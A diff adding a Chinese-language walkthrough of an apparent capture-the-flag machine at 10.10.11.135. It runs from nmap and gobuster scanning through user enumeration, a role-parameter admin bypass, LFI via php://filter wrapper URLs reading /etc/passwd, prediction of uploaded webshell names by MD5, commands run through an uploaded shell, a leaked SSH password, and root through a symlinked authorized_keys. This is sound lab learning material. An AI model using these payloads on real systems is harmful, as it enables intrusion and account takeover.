@@ -1,0 +1,39 @@
+nmap -sV -sC -Pn  10.10.11.135 > nmap.txt
+gobuster dir  -u http://10.10.11.135/ -w /Users/timmy/Tools/SecLists/Discovery/Web-Content/common.txt -x txt,php > gobuster.txt
+
+nmap找到80端口的燈下頁面，burp發現登入頁面可驗証書有效用戶
+攥寫python腳本查找到aaron用戶，弱密碼可直接登入
+登入後可以更新用戶訊息，查看burp返回可以看到其他參數
+將role改成1可以看到admin panel
+可正常上傳xxx.jpg
+F12查看可以看到調用src="js/avatar_uploader.js"
+訪問http://10.10.11.135/js/avatar_uploader.js 可以看到js內容
+url('/image.php?img=images/background.jpg'
+直接訪問發現可以將圖片開啟
+http://10.10.11.135/image.php?img=images/background.jpg
+嘗試修改成etc/passwd
+http://10.10.11.135/image.php?img=../../../../../etc/passwd
+發現會被阻擋，上網搜索LFI php wrapper
+http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=index.php
+http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd
+http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=images/uploads/source-files-backup.zip
+後台可以上傳jpg檔案，上傳php command 檔案修改後墜可以上傳成功
+查看到uploads.php的內容代碼顯示上傳後的檔名創建方式
+md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
+使用php -a 可以直接計算出md5值
+echo md5('$file_hash' . strtotime('Sun, 24 Jul 2022 14:11:40 GMT'));
+取得檔案名稱後，可以直接訪問檔案
+http://10.10.11.135/image.php?img=images/uploads/c6dbf6a3ea03e1a59ea2cc282b7d8e16_reverse.jpg&cmd=ls
+http://10.10.11.135/image.php?img=images/uploads/1deaf4097a2f552e0e9f4b1dd4748275_shell.jpg
+
+嘗試許多方式都無法成功取得reverse shell
+在opt下發現source-files-backup.zip檔案
+http://10.10.11.135/image.php?img=images/uploads/source-files-backup.zip
+
+
+e4e214696159a25c69812571c8214d2bf8736a3f  16de2698b5b122c93461298eab730d00273bd83e
+下載後發現git歷史紀錄有aaron密碼，使用密碼ssh登入
+
+S3cr3t_unGu3ss4bl3_p422w0Rd
+sudo -l 發現有/usr/bin/netutils權限
+可以root用戶下檔檔案，軟連接authorized_keys到/root/.ssh/authorized_keys
